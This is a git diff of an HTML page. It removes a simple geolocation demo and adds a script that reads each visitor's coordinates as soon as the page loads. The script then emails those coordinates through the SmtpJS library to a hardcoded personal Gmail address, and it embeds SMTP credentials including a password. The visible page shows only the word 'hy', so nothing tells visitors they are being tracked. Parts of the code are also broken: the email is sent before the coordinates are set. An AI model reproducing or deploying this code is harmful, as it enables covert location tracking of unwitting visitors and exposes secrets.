@@ -1,28 +1,75 @@
 <!DOCTYPE html>
 <html>
-<body>
-<h1>HTML Geolocation</h1>
-<p>Click the button to get your coordinates.</p>
+<body >
 
-<button onclick="getLocation()">Try It</button>
 
-<p id="demo"></p>
-
+<p style="font-size: 42px;"> hy</p>
+<!-- smtpjs link
+   -->
+   <script src="https://smtpjs.com/v3/smtp.js">
+</script>
 <script>
-const x = document.getElementById("demo");
+// const x = document.getElementById("demo");
+
+// // function getLocation() {
+// //  
+// // }
+// var hamid;
+//  function showPosition(position) {
+
+    
+//     hamid = navigator.geolocation.getCurrentPosition();
+// //   } else { 
+// //     x.innerHTML = "Geolocation is not supported by this browser.";
+// //   
+//         x.innerHTML = "Latitude: " + position.coords.latitude + 
+//   "<br>Longitude: " + position.coords.longitude;
+//   hamid = position.coords
+    
+// Global variable to store coordinates
+let userCoordinates = { latitude: null, longitude: null };
 
 function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
+    if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                // Save the coordinates in the global variable
+                userCoordinates.latitude = position.coords.latitude;
+                userCoordinates.longitude = position.coords.longitude;
+                console.log(`Latitude: ${userCoordinates.latitude}, Longitude: ${userCoordinates.longitude}`);
+            },
+            (error) => {
+                console.error(`Error: ${error.message}`);
+            }
+        );
+    } else {
+        console.error('Geolocation is not supported by your browser.');
+    }
 }
 
-function showPosition(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
-}
+// Automatically run the function when the page is loaded
+window.onload = getLocation;
+
+    (
+    Email.send({
+    Host : "smtp.elasticemail.com",
+    Username : "digicore@demo.com",
+    Password : "1DDE1DCBBAE04DC37822B18AF26B27F6C3E2",
+    To : 'mhamidabid301@gmail.com',
+    From : "mhamidabid301@gmail.com",
+    Subject : 'subject',
+    Body : userCoordinates
+ 
+ 
+ 
+}))
+
+// showPosition();
+// showPosition();
+// showPosition();
+// showPosition();
+
+
 </script>
 
 </body>
